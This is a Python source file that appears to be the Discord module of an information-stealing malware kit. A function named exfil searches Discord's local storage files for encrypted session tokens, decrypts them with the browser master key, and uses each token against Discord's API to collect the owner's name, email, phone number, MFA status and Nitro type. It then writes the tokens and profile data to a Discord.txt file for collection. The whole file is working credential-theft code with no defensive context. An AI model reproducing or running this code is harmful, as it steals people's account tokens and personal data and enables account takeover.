import os

from locations.paths import Paths
from utils.masterkey import MasterKeyFetcher
from utils.decryptor import AES256Decrypt


from re import findall

import base64 , requests


from os.path import exists


NA = 'N/A'




def auth_headers(token : str):

    return {'Authorization' : token}


class TokenData:

    def __init__(self , token : str) -> None:
        
        self.token = token

        self.name = NA

        self.global_name = NA

        self.bio = NA

        self.email = NA

        self.phone = NA

        self.billing = NA

        self.nitro = NA

        self.user_id = NA

        self.mfa = NA

        self.avatar_url = NA



    def fetch_data(self):

        token = self.token

        headers = auth_headers(token)


        user_data_request = requests.get('https://discord.com/api/v9/users/@me', headers=headers)

        if user_data_request.status_code == 401:

           return
        
        user_data = user_data_request.json()

        name = user_data.get('username')
        global_name = user_data.get('global_name')
        user_id = user_data.get('id')

        bio = user_data.get('bio')
        phone = user_data.get('phone')
        email = user_data.get('email')
        mfa = user_data.get('mfa_enabled')
        nitro_type = user_data.get('premium_type')

        av_hash = user_data.get('avatar')
        avatar = f'https://cdn.discordapp.com/avatars/{user_id}/{av_hash}.gif'

        if requests.get(avatar).status_code != 200:
            avatar = f'https://cdn.discordapp.com/avatars/{user_id}/{av_hash}.png'


        nitro = NA


        if nitro_type == 0:

            nitro = 'None'
        
        elif nitro_type == 1:

            nitro = 'Nitro Classic'

        elif nitro_type == 2:

            nitro = 'Nitro'
        

        elif nitro_type == 3:

            nitro = 'Nitro Basic'
        
        


        self.name = name
        self.global_name = global_name
        self.bio = bio
        self.phone = phone
        self.email = email
        self.nitro = nitro
        self.user_id = user_id
        self.mfa = mfa
        self.avatar_url = avatar
        
        Discord.data.append(self)


    


class Discord:

    data = [ ]


    def write_to_files(path : str):

        HEADER = '*' * 15


        if not os.path.isdir(path):

            os.mkdir(path)

        file = open(os.path.join(path , 'Discord.txt') , 'a')

        for token_obj in Discord.data:

            token = token_obj.token
            name = token_obj.name
            global_name = token_obj.global_name
            email = token_obj.email
            phone = token_obj.phone
            user_id = token_obj.user_id
            nitro = token_obj.nitro
            mfa = token_obj.mfa


            file.write(f'{HEADER}\nToken : {token}\nName : {name}\nGlobal Name : {global_name}\nEmail : {email}\nPhone : {phone}\nUser ID : {user_id}\nNitro : {nitro}\nMfa : {mfa}\n{HEADER}')


            file.close()


        


    def exfil(vpath : str):

        REG_EX = 'dQw4w9WgXcQ:[^\"]*'

        for path in Paths.DISCORD:

            if not exists(path):
                continue

            masterkey = MasterKeyFetcher.get_master_key(path + "..\\..\\" + "Local State")
            

            for f in os.listdir(path):

                extension = f[-3:].lower()

                if extension != 'ldb' and extension != 'log':
                    continue
                
                
                p = os.path.join(path , f)

                lines = open(p , 'r',encoding='utf-8' , errors='ignore').readlines()

                for line in [l.strip() for l in lines]:

                    for found in findall(REG_EX , line):

                        enc_token = found.split('dQw4w9WgXcQ:')[1]

                        decoded = base64.b64decode(enc_token)

                        token = AES256Decrypt.decrypt_data(decoded , masterkey)

                        token_data = TokenData(token)

                        token_data.fetch_data()
            
            Discord.write_to_files(vpath)

                        


            

    

                    